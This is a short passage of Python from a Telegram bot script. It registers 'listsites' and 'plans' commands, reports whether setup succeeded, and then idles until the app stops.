            BotCommand("listsites", "View Sites"),
            BotCommand("plans", "View Plans")
        ]
        try:
            await app.set_bot_commands(commands)
            print("✅ COMMANDS CONFIGURED")
        except Exception as e:
            print(f"❌ Failed to set commands: {e}")
            
        await idle()
        await app.stop()
        
    app.run(main())
